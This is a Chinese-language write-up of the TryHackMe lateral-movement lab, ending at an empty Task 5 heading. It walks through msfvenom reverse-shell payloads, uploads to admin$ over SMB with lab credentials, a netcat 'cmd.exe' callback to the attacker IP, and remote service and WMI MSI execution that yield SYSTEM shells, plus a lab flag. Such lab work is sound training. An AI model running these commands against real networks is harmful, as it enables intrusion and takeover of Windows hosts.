# 前置代理

这个房间我在本地无法直连vpn，需要加前置代理

## ssh
只能转发tcp

ssh动态绑定本地转发端口
```
ssh -N -D 127.0.0.1:9050 root@207.246.124.194
```
在ovpn最前面加这两行
```
socks-proxy 127.0.0.1 9050
route t3.50redlight.com 255.255.255.255 net_gateway
```

# kali配置DNS

配置DNS文件
```
vim /etc/resolv.conf 
```

上面配置文件填入以下内容
```
nameserver 10.200.64.101     #THMDC的ip
nameserver 114.114.114.114   #真实的DNS地址，以保证kali还能连接网络
```

重启网络
```
systemctl restart systemd-resolved
```

验证
```
┌──(root💀kali)-[/etc/NetworkManager]
└─# nslookup thmdc.za.tryhackme.com
Server:         10.200.64.101
Address:        10.200.64.101#53

Name:   thmdc.za.tryhackme.com
Address: 10.200.64.101


```

# Task 3  Spawning Processes Remotely

登录```http://distributor.za.tryhackme.com/creds```生成一个用户登录凭据

```
Your credentials have been generated: Username: jenna.field Password: Income1982
```

ssh到靶机
```
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  za\\jenna.field@thmjmp2.za.tryhackme.com -p 22
```

现在假设我们已经获取了一组管理员账号信息，利用这组信息进行横向

```
User: ZA.TRYHACKME.COM\t1_leonard.summers

Password: EZpass4ever
```

## 使用 sc远程 创建服务

1. kali生成一个exe payload

```
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.61.205 LPORT=4444 -o max.exe
```


2. 利用获得的管理员凭据，上传到需要横向的靶机
```
smbclient -c 'put max.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

3. kali开启一个msf监听

```
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.50.61.205     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.50.61.205:4444 
```

4. 在ssh的靶机获得一个管理员的shell

```
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.61.205 4443"
```

5. kali接收到上面命令返回来的shell


```
┌──(root💀kali)-[~/tryhackme/LateralMovementandPivoting]
└─# nc -lnvp 4443                  
listening on [any] 4443 ...
connect to [10.50.61.205] from (UNKNOWN) [10.200.64.249] 63401
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
za\jenna.field

C:\Windows\system32>

```

虽然显示是za\jenna.field，但其实已经有```t1_leonard.summers```的管理员权限
```
C:\Windows\system32>dir \\thmiis.za.tryhackme.com\c$
dir \\thmiis.za.tryhackme.com\c$
 Volume in drive \\thmiis.za.tryhackme.com\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\thmiis.za.tryhackme.com\c$

01/04/2022  07:47 AM               103 delete-vagrant-user.ps1
02/27/2022  10:46 AM    <DIR>          inetpub
02/27/2022  10:46 AM    <DIR>          logs
09/15/2018  07:19 AM    <DIR>          PerfLogs
04/25/2022  12:19 PM    <DIR>          Program Files
02/28/2022  11:02 AM    <DIR>          Program Files (x86)
04/24/2022  11:16 AM        76,021,760 splunkforwarder-windows.msi
04/24/2022  11:17 AM               309 splunk_command.bat
06/20/2022  01:39 AM    <DIR>          Temp
03/20/2022  02:52 PM               153 thm-mdtcopy.ps1
03/02/2022  07:50 PM               712 thm-network-setup.ps1
02/27/2022  10:40 AM    <DIR>          tmp
06/17/2022  06:00 PM    <DIR>          tools
06/15/2022  04:31 PM    <DIR>          Users
02/27/2022  10:37 AM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
08/09/2022  06:17 AM    <DIR>          Windows
               5 File(s)     76,023,037 bytes
              11 Dir(s)  46,548,951,040 bytes free

```

6. 创建服务

当前shell下创建一个服务，把服务的二进制数据与之前上传的exe相关联
```
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create just-test-sc binPath= "%windir%\max.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com create just-test-sc binPath= "%windir%\max.exe" start= auto
[SC] CreateService SUCCESS

```

启动服务
```
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start just-test-sc
sc.exe \\thmiis.za.tryhackme.com start just-test-sc

SERVICE_NAME: just-test-sc 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3804
        FLAGS              : 
```

7. msf收到返回的shell

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.50.61.205:4444 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.200.64.201
[*] Command shell session 1 opened (10.50.61.205:4444 -> 10.200.64.201:58218) at 2022-08-09 02:32:05 -0400


C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   IPv4 Address. . . . . . . . . . . : 10.200.64.201
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.200.64.1

C:\Windows\system32>hostname
hostname
THMIIS

C:\Windows\system32>

```

> After running the "flag.exe" file on t1_leonard.summers desktop on THMIIS, what is the flag?

> THM{MOVING_WITH_SERVICES}

# Task 4  Moving Laterally Using WMI

ssh到靶机
```
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  za\\jenna.field@thmjmp2.za.tryhackme.com -p 22
```

现在假设我们已经获取了一组管理员账号信息，利用这组信息进行横向

```
User: ZA.TRYHACKME.COM\t1_corine.waters

Password: Korine.1994
```

## 通过WMI安装MSI包

1. kali编译MSI包

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.61.205 LPORT=4445 -f msi > max.msi
```

2. 利用smb上传到靶机

```
smbclient -c 'put max.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```

3. 开启msf监听

```
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/shell_reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.50.61.205     yes       The listen address (an interface may be specified)
   LPORT     4445             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.50.61.205:4444 
```

4. 用powershell开启一个THMIIS 的 WMI 会话

```
PS C:\tools> $username = 't1_corine.waters';                                                           
PS C:\tools> $password = 'Korine.1994';                                                                
PS C:\tools> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;                   
PS C:\tools> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;                                                                                                   
PS C:\tools> $Opt = New-CimSessionOption -Protocol DCOM                                                
PS C:\tools> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop 
```

利用session，执行安装msi文件操作
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\max.msi"; Options = ""; AllUsers = $false}
```

5. 收到rev shell
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.50.61.205:4445 
[*] Command shell session 1 opened (10.50.61.205:4445 -> 10.200.64.201:49264 ) at 2022-08-09 03:07:27 -0400


Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   IPv4 Address. . . . . . . . . . . : 10.200.64.201
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.200.64.1

C:\Windows\system32>hostname
hostname
THMIIS

```

# Task 5  Use of Alternate Authentication Material



